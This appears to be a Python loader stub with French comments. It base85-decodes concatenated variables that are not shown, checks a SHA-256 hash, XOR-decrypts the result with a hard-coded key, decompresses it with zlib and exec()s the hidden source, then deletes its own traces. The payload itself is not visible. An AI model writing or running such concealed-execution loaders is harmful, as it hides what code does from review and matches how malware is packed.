_prG_GUjKoVOIpM = __import__('base64').b85decode(_c_aJuqFO_ws1AW + _cuKAjFJ0qPQMOB + _cvZhnhuvgBrJHq + _ceQJhE6bcaZ1fv + _c_3oDpBmbjmLZ7 + _capLtMkkNWVvRC + _c_jwXXbVeCX6S8 + _cdW5IpYqv_9slJ + _ctYKOTffoq35QL + _cpu6stSF6gBKab + _clmGCDZUmpLxLv + _c_uw1XhkdJE9Fk + _cuMyGOzxD9_pKd + _ckcWlFtE_u_Q0L + _ckke7u91qhXoQS + _ctmJ5481deCu7u + _cd6LcCg7uwfYHW + _cvU47N8WLUnifn + _ctmBBfnLSTNvKr + _cv5K0ZHbKFWxiQ + _chhzsDIbeNt1Jt + _cn765e1ttQzSHc + _czlmYPK2f11caL + _col3TK5fvsql1X + _cnbVVmP_lsxqv8 + _cu_4FB3tliaeG7 + _caVLHPaMvmp4c5 + _crDbe4hN6oRBN_ + _cx6KBuvN5X4hds + _cbbZxxtrARTvjs + _cpeIyxOYw8qNcB + _cbUnZrx2ZbmNJ9 + _chMKeIHjiraZ2G + _cdQPxJ280bcmM_ + _cfwi1U9Tzsk_yA + _cnV8LFm7_eS6ip + _cqbdy1ZmWxREL8 + _csknSgXT2Xjrcq + _ch8TOOjRicBY_8 + _cbznIbqJFaktQu + _cxhH7Zwm2Zc0K8 + _cajDB4i6oFPBV0 + _cec5BuLs1C08vh + _cjOtH4c5iPm8iH + _c_G9UIeVuIBIjD + _clAJdMn6d5PJys + _ck87HhrGlcEOxL + _chOYMSjCtB56FT + _cmli1pRHWRWZEN + _cgnJZSnHWOuHJO + _cb_drujTo8g8Us + _cgKIa4sloCigNs + _cbZjNrr1qv5jpL + _cnTRjjXvuJKG70 + _c_wIAHZ6_1nePA + _cmVO6v1biqQ97U + _cs4MoGKr0rmgqS + _cvFX3hR7un6nE9 + _cmlS5fQ_9ftqy8 + _cn7fnWZlhHP2Eh + _cvQuuXuUf1yvWQ + _cdbkS1Re9jOS2F + _ceFOdtJ8lA0Jjn + _ce3jIeO4BdYcpn + _cplVGDHFHjzRjc + _coWwyAdhheStjq + _coRnSiOGSGuuZ3 + _crZpyItgmdNVpX + _ceTDJo3WvysZaV + _ciJGKv0JJGuPM8 + _cl1Z2ewIZQbxfW + _cvdxsNUw_Ny9i0 + _cl2tpM72vK1Qnn + _cp8OqdACjEZ3A1 + _cfb7Vn8L93jYAm + _cySxWdopoM4n2M + _cq2NMAhelhOeJC + _cxKmU1mfYQ8_4P + _cgGy66Rw381MEV + _cgj8er4sZDZTTW + _cwYtejIoIAuFKA + _cxmAjAA5WpVCJy + _ceDbX8bWbtQGrj + _cko3OG2_MLRoix + _cv1yXXMGCw2F4M + _cs462CNSWYiVNz + _cwzYYkTsyOEvhQ + _cp7y_ffIfGwZph + _co5JYRmINWqG09 + _cuFhL5n5B4DDyO + _cy1i25s5OPA5Bh + _cnCSRs9EtWt5Ja + _cgum8i1CUiWhJZ + _cbyoh6ydRlByHU + _co1KvkyWWxJCVZ + _cw4ymnSEbMPcwe + _cmr93l5H6UhktZ + _csfJO6AEHKRNIb + _ctC5l53O18YEhV + _cz4f5i9mWok9UP + _ctiSOmogP5dImk + _cjUEQNfZ_7uQbS + _cbDtC81bw9RgWS + _cf_6FpKlroUhrS + _cjNqHrkSsxfcry + _cxIchY21Qxspph + _cto96oISRcyYE_ + _couYKrVfH_Ey9y + _cwIlZR8xsCuQ0E + _cpim2slBnG0JtC + _cvOFOsrHXMUMzY + _ckVhPBbAguuTfh + _coBE5HjhYRTTe0 + _cuOiKmw4ki_pFm + _ciMFveNeIffXxQ + _cbIuyayek110SU + _chqH8Zx7XiLdnN + _cjqi3bSgr6Szlc + _csqXc0Z7zuaPhx + _cok6xSlRJSVZPk + _cjPYzuT5vmGURK + _cf8txJy9vEtkQe + _cxx887OBP6NR5u + _ct5IYFnYEuh_id + _cx3nReWwB3bkg7 + _cvf4JrehkYA2hu + _csMsKviNFxB7ib + _ceZX2LeoWJLDHc + _cvsa6qHI4Qj7u9 + _c_GKYqtprLBwnz + _cdjHqPOLq3sx8A + _chLCCcPTgMMTYj + _cj7_BXROFD1oCi + _cbeNuzWklI6Iy7 + _cfFTcPUCGc1W4u + _ca8tzolTY782vP + _cn6tM79sub_s1q + _cv2cOT3T0vKgRN + _coV8BT16sGHxTd + _c_7V58_9dUoZry + _cf1l07x2a8fOlg + _cv6XXojf6iPM9E + _czMjLeBkxZloLr + _ccf9tMznHsLTNz + _cy3OimywxtYYD8 + _cth4caxvpwriEs + _co6R64ognHQJAk)
if __import__('hashlib').sha256(_prG_GUjKoVOIpM).hexdigest() != '3ea9e20553392d1dafcf7824b755c1be1371956fc85573ee9352f6abd597c6f3':
    __import__('sys').exit(1)
_xwDpnE6sQUofYf = bytes([206, 105, 253, 209, 218, 81, 132, 177, 80, 141, 10, 108, 160, 7, 178, 188])
_fkzRt3G46ceO7Ok = bytes([118, 46, 142, 228, 122, 88, 33, 63, 117, 167, 209, 156, 168, 252, 45, 108])

def _fxuHgXFrt0d0WOr(_byw1gcQ0vb4tkd, _kqbCcwHJLwAO1_):
    return bytes(_byw1gcQ0vb4tkd[_iey3_hxvi3xNhm] ^ _kqbCcwHJLwAO1_[_iey3_hxvi3xNhm % len(_kqbCcwHJLwAO1_)] for _iey3_hxvi3xNhm in range(len(_byw1gcQ0vb4tkd)))

def _fdfnS8XZDCS5e95(_tpsycZK6KDMmVW):
    import zlib
    return zlib.decompress(_tpsycZK6KDMmVW) # Un seul niveau de zlib ici pour simplifier

def _feg2SonmOV5wY9E():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xroA4IelWOsp9D = _fxuHgXFrt0d0WOr(_prG_GUjKoVOIpM, _xwDpnE6sQUofYf)
    # 2. Décompression Zlib
    _dbguk8CunZp7V0 = _fdfnS8XZDCS5e95(_xroA4IelWOsp9D)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dbguk8CunZp7V0.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _ngNclt9lmPFsmv = _main.__dict__
    _ngNclt9lmPFsmv.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _ngNclt9lmPFsmv)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feg2SonmOV5wY9E()
try:
    del _fxuHgXFrt0d0WOr, _fdfnS8XZDCS5e95, _feg2SonmOV5wY9E
    del _prG_GUjKoVOIpM, _xwDpnE6sQUofYf, _fkzRt3G46ceO7Ok
except:
    pass
